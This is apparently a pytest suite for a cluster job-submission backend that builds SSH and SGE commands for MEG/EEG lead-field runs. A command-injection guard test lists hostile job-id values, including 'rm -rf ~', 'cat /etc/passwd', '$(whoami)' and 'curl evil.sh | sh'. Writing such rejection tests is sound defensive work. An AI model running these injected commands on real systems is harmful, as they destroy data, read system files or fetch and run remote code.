"""Tests for cluster submission backend (dry-run; no real SSH)."""
from __future__ import annotations

import importlib
import re
from pathlib import Path

import pytest

cluster = importlib.import_module("gui.backend.cluster")


def test_list_profiles_has_myriad_and_kathleen() -> None:
    profiles = cluster.list_profiles()
    assert "myriad" in profiles
    assert "kathleen" in profiles


def test_validate_profile_rejects_unknown() -> None:
    with pytest.raises(cluster.ClusterError):
        cluster.validate_profile("nope")
    with pytest.raises(cluster.ClusterError):
        cluster.validate_profile("../etc/passwd")  # path-injection guard
    cluster.validate_profile("myriad")  # ok


def test_profile_vars_parse() -> None:
    pv = cluster.profile_vars("myriad")
    assert pv["REMOTE_HOST"] == "myriad"
    assert pv["SCHEDULER"] == "sge"
    # the escaped \${HOME} is normalised back to ${HOME} for the remote shell
    assert pv["REMOTE_BASE"] == "${HOME}/Scratch/inob"


def test_parse_job_id() -> None:
    assert cluster.parse_job_id("Your job 1234567 (\"vagus_fwd\") has been submitted") == "1234567"
    assert cluster.parse_job_id('Your job-array 222.1-32:1 ("vagus_fwd") has been submitted') == "222"
    assert cluster.parse_job_id("garbage") is None


def test_map_sge_state() -> None:
    assert cluster.map_sge_state("r") == "running"
    assert cluster.map_sge_state("qw") == "queued"
    assert cluster.map_sge_state("Eqw") == "failed"
    assert cluster.map_sge_state("") == "done"


def test_build_commands_shape() -> None:
    cmds = cluster.build_commands("myriad")
    assert cmds["stage"][0] == "bash" and cmds["stage"][1].endswith("cluster/stage.sh")
    # submit runs over SSH to the profile host, invoking submit.sh array/reduce
    assert cmds["submit_array"][0] == "ssh" and cmds["submit_array"][1] == "myriad"
    assert "cluster/submit.sh array" in cmds["submit_array"][2]
    assert "cluster/submit.sh reduce" in cmds["submit_reduce"][2]
    assert "CLUSTER_PROFILE=myriad" in cmds["submit_array"][2]
    # config is pushed to the remote default.yaml the body scripts read
    assert cmds["push_config"][-1] == "myriad:${HOME}/Scratch/inob/configs/default.yaml"


def test_build_commands_eeg_queues_the_eeg_job_not_the_meg_array() -> None:
    """modality used to be accepted and ignored — an EEG request queued a MEG solve."""
    cmds = cluster.build_commands("myriad", modality="eeg")
    assert "cluster/submit.sh eeg" in cmds["submit_eeg"][2]
    assert "submit_array" not in cmds and "submit_reduce" not in cmds
    assert cluster.submit_tasks("eeg") == ("submit_eeg",)
    assert cluster.submit_tasks("meg") == ("submit_array", "submit_reduce")


def test_validate_modality_rejects_unknown() -> None:
    with pytest.raises(cluster.ClusterError):
        cluster.build_commands("myriad", modality="ecog")


# ── remote command injection guard ──────────────────────────────────────────
#
# status() interpolates the job id into a command string executed by the REMOTE
# shell. Anything that isn't a plain scheduler id must be rejected outright.

@pytest.mark.parametrize("bad", [
    '1"; rm -rf ~ ;#',
    "123; cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "123 && curl evil.sh | sh",
    "../../etc/passwd",
    "",
    None,
])
def test_validate_job_id_rejects_shell_metacharacters(bad) -> None:
    with pytest.raises(cluster.ClusterError):
        cluster.validate_job_id(bad)


@pytest.mark.parametrize("good", ["1", "123456", "222.1", "222_1"])
def test_validate_job_id_accepts_real_ids(good) -> None:
    assert cluster.validate_job_id(good) == good


def test_status_rejects_injected_job_id_before_any_ssh(monkeypatch) -> None:
    def _boom(*a, **k):
        raise AssertionError("ssh must not run for an invalid job id")

    monkeypatch.setattr(cluster, "_run", _boom)
    monkeypatch.setattr(cluster, "_ssh_reachable", _boom)
    with pytest.raises(cluster.ClusterError):
        cluster.status("myriad", '1"; rm -rf ~ ;#')


def test_write_run_config_injects_point_sources(tmp_path) -> None:
    import yaml
    out = tmp_path / "run.yaml"
    cluster.write_run_config(
        [{"x": 1.0, "y": 2.0, "z": 3.0, "strength_nAm": 70}], out_path=out,
    )
    raw = yaml.safe_load(out.read_text())
    assert raw["forward"]["point_sources"] == [[1.0, 2.0, 3.0]]


def test_write_run_config_uses_the_working_config_and_never_clobbers_it(
    tmp_path, monkeypatch,
) -> None:
    """A submit must ship what the GUI is editing, and leave it untouched.

    It previously read default.yaml and wrote the result back over the working
    copy, discarding every advanced edit both locally and on the cluster.
    """
    import yaml
    working = tmp_path / "gui_working.yaml"
    working.write_text(yaml.safe_dump({"marker": "edited-by-user"}))
    submit_to = tmp_path / "gui_submit.yaml"
    monkeypatch.setattr(cluster, "WORKING_CONFIG", working)
    monkeypatch.setattr(cluster, "SUBMIT_CONFIG", submit_to)

    out = cluster.write_run_config([{"x": 1.0, "y": 2.0, "z": 3.0}])

    assert out == submit_to
    shipped = yaml.safe_load(submit_to.read_text())
    assert shipped["marker"] == "edited-by-user"           # the user's edits, not defaults
    assert shipped["forward"]["point_sources"] == [[1.0, 2.0, 3.0]]
    # the working copy is byte-for-byte untouched
    assert yaml.safe_load(working.read_text()) == {"marker": "edited-by-user"}


def test_submit_dryrun(monkeypatch, tmp_path) -> None:
    monkeypatch.setenv("INOB_CLUSTER_DRYRUN", "1")
    # keep the submission-config write out of the repo
    monkeypatch.setattr(cluster, "SUBMIT_CONFIG", tmp_path / "gui_submit.yaml")
    res = cluster.submit("myriad", sources=[{"x": 0, "y": 0, "z": 0, "strength_nAm": 70}])
    assert res["state"] == "dryrun"
    assert res["job_id"] is None
    joined = "\n".join(res["commands"])
    assert "stage.sh" in joined and "submit.sh array" in joined


def test_submit_dryrun_eeg_lists_the_eeg_command(monkeypatch, tmp_path) -> None:
    monkeypatch.setenv("INOB_CLUSTER_DRYRUN", "1")
    monkeypatch.setattr(cluster, "SUBMIT_CONFIG", tmp_path / "gui_submit.yaml")
    res = cluster.submit("myriad", sources=[], modality="eeg")
    joined = "\n".join(res["commands"])
    assert "submit.sh eeg" in joined
    assert "submit.sh array" not in joined
    assert res["modality"] == "eeg"


def test_status_dryrun(monkeypatch) -> None:
    monkeypatch.setenv("INOB_CLUSTER_DRYRUN", "1")
    res = cluster.status("myriad", "123456")
    assert res["state"] == "dryrun"
    assert "qstat" in res["detail"]


def test_fetch_dryrun(monkeypatch) -> None:
    monkeypatch.setenv("INOB_CLUSTER_DRYRUN", "1")
    res = cluster.fetch("kathleen")
    assert res["state"] == "dryrun"
    assert "rsync" in res["command"]


def test_fetch_uses_the_configured_target_not_a_hardcoded_vagus(monkeypatch) -> None:
    """run_reduce.sh names the npz after TARGET_TAG, so fetch must follow it."""
    monkeypatch.setenv("INOB_CLUSTER_DRYRUN", "1")
    monkeypatch.setattr(cluster, "leadfield_name",
                        lambda modality="meg": "duneuro_leadfield_spine.npz")
    res = cluster.fetch("kathleen")
    assert "duneuro_leadfield_spine.npz" in res["command"]
    assert "duneuro_leadfield_vagus.npz" not in res["command"]


# ── Python <-> shell source-target mirror ──────────────────────────────────
#
# cluster/lib.sh duplicates SOURCE_TARGETS so the SGE scripts can resolve a
# target without importing Python. Duplication drifts, and drift here means a
# cluster run solves a different tissue than the same flag does locally.

def _lib_sh_targets() -> dict[str, str]:
    """Parse the SOURCE_TARGET -> TISSUES case block out of cluster/lib.sh."""
    lib = Path(__file__).resolve().parents[1] / "cluster" / "lib.sh"
    body = lib.read_text()
    block = re.search(
        r"inob__source_target\(\)\s*\{.*?\bcase\b.*?\besac\b", body, re.S,
    )
    assert block, "could not locate the case block in cluster/lib.sh"
    return {
        m.group("tag"): m.group("tissues")
        for m in re.finditer(
            r'^\s*(?P<tag>\w+)\)\s*TISSUES="(?P<tissues>[^"]+)"',
            block.group(0), re.M,
        )
    }


def test_lib_sh_mirrors_source_targets_exactly() -> None:
    from inob.config import SOURCE_TARGETS
    shell = _lib_sh_targets()
    assert set(shell) == set(SOURCE_TARGETS), (
        "cluster/lib.sh and inob.config.SOURCE_TARGETS disagree on which "
        "targets exist"
    )
    for tag, spec in SOURCE_TARGETS.items():
        assert shell[tag] == spec["tissues"], (
            f"target {tag!r}: lib.sh solves {shell[tag]!r} but Python solves "
            f"{spec['tissues']!r}"
        )
